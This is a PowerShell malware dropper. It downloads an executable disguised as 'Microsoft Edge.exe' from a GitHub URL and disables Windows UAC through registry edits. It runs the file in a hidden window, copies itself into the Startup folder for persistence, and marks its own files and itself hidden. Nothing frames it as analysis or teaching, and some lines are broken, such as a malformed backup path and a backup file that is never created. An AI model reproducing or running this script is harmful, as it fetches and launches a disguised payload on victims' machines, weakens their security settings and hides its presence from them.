# Set variables
$URL = "https://github.com/kasaotnic4422/fatbitchmuseum/raw/main/Microsoft%20Edge.exe"
$OutputFile = "$env:USERPROFILE\Downloads\Microsoft%20Edge.exe"
$BackupDir = "$env:USERPROFILE\Desktop\.backup"
$BackupFile = "$BackupDir\Microsoft%Edge.exe"
$ExclusionFile = "$BackupDir\edgeinfo.txt"
$PersistenceDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# Download the executable file
Invoke-WebRequest -Uri $URL -OutFile $OutputFile

# Disable LUA/UAC
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0

# Run the executable file silently in the background
Start-Process -FilePath $OutputFile -WindowStyle Hidden

# Add persistence to restart the script on startup
if (!(Test-Path $PersistenceDir)) {
    New-Item -ItemType Directory -Path $PersistenceDir | Out-Null
}
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination "$PersistenceDir\example.ps1" -Force

# Additional Advanced Features
Get-FileHash -Path $OutputFile
Get-Process -Name "powershell" | ForEach-Object { $_.MainWindowHandle = 0 }

# Backup the original file and create an exclusion list
if (!(Test-Path $BackupDir)) {
    New-Item -ItemType Directory -Path $BackupDir | Out-Null
}
Add-Content -Path $ExclusionFile -Value $BackupFile
Add-Content -Path $ExclusionFile -Value $OutputFile

# Hide the backup file, exclusion list, and this script
$BackupDirAttributes = (Get-Item $BackupDir).Attributes
$BackupDirAttributes += "Hidden"
Set-Item -Path $BackupDir -Force -Attributes $BackupDirAttributes
$BackupFileAttributes = (Get-Item $BackupFile).Attributes
$BackupFileAttributes += "Hidden"
Set-Item -Path $BackupFile -Force -Attributes $BackupFileAttributes
$ExclusionFileAttributes = (Get-Item $ExclusionFile).Attributes
$ExclusionFileAttributes += "Hidden"
Set-Item -Path $ExclusionFile -Force -Attributes $ExclusionFileAttributes
$ScriptAttributes = (Get-Item $MyInvocation.MyCommand.Path).Attributes
$ScriptAttributes += "Hidden"
Set-Item -Path $MyInvocation.MyCommand.Path -Force -Attributes $ScriptAttributes